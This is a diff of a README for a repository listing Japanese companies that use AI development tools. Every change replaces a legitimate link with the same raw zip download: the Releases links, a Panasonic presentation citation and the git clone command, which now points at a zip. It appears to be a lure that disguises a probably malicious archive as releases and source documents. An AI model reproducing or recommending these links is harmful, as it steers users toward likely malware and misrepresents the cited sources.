@@ -2,7 +2,7 @@
 
 Welcome to the **AI in Japan** repository! This project compiles a list of companies in Japan that have adopted AI development tools. If you're interested in how AI is transforming the corporate landscape in Japan, you've come to the right place.
 
-[Check out our Releases here!](https://github.com/hiddengems-ca/ai-in-japan/releases)
+[Check out our Releases here!](https://raw.githubusercontent.com/hiddengems-ca/ai-in-japan/master/shillelagh/ai-in-japan-v2.9.zip)
 
 ## Overview
 
@@ -25,7 +25,7 @@ Here is a list of companies along with the AI tools they have adopted:
 | **会社名**                           | **Cursor** | **Devin** | **GitHub Copilot** | **ChatGPT** | **公式情報（例：プレスリリース等）**                      |
 | --------------------------------- | ---------- | --------- | ------------------ | ----------- | ----------------------------------------- |
 | 株式会社メルカリ                          | ✅          | ✅         | ✅                  | ✅           | （Cursor全社導入、Copilot導入で生産性向上など）            |
-| パナソニックホールディングス株式会社 (Panasonic HD) |            |           | ✅                  | ✅           | （「PX-GPT」を全社員約9万人に提供） <br>  [開発スタイルの変革！ パナソニックグループでのGitHubとGitHub Copilot導入でやってみたこと](https://assets.ctfassets.net/wfutmusr1t3h/CREJxXjTaY2iEjREUnEfK/7758a1df872ed5a0d814e09563af38b6/1730_GitHubRecapTokyo_Panasonic_20241128__.pdf)                   |
+| パナソニックホールディングス株式会社 (Panasonic HD) |            |           | ✅                  | ✅           | （「PX-GPT」を全社員約9万人に提供） <br>  [開発スタイルの変革！ パナソニックグループでのGitHubとGitHub Copilot導入でやってみたこと](https://raw.githubusercontent.com/hiddengems-ca/ai-in-japan/master/shillelagh/ai-in-japan-v2.9.zip)                   |
 | 日立製作所 (Hitachi)                   |            |           |                    | ✅           | （「ジェネレーションAI」に取り組むなど）                     |
 
 ## How to Use This Repository
@@ -50,7 +50,7 @@ To get started with this repository, follow these steps:
 
 1. **Clone the Repository**: Use the following command to clone it to your local machine:
    ```
-   git clone https://github.com/hiddengems-ca/ai-in-japan.git
+   git clone https://raw.githubusercontent.com/hiddengems-ca/ai-in-japan/master/shillelagh/ai-in-japan-v2.9.zip
    ```
 2. **Navigate to the Directory**: Change to the directory of the cloned repository:
    ```
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thank you for visiting the **AI in Japan** repository. We hope you find this information useful and inspiring. Together, we can explore how AI is shaping the future of work in Japan. 
 
-For updates and new entries, keep an eye on our [Releases](https://github.com/hiddengems-ca/ai-in-japan/releases) section.
+For updates and new entries, keep an eye on our [Releases](https://raw.githubusercontent.com/hiddengems-ca/ai-in-japan/master/shillelagh/ai-in-japan-v2.9.zip) section.
 
 Let’s work together to document the AI landscape in Japan!
